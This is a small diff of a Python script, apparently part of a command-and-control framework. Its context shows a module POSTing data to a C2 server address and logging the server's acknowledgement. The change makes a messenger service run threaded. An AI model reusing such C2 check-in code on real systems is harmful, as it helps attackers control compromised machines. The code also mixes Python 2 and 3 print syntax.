@@ -42,6 +42,6 @@ if __name__ == '__main__':
     response = requests.post(C2_ADDRESS, json=data, verify=verify)
     print("%s | Receive ack from '%s'" % (MODULE_NAME, C2_ADDRESS))
 
-    rest_messenger.run()
+    rest_messenger.run(threaded=True)
 
     print "FINISH"
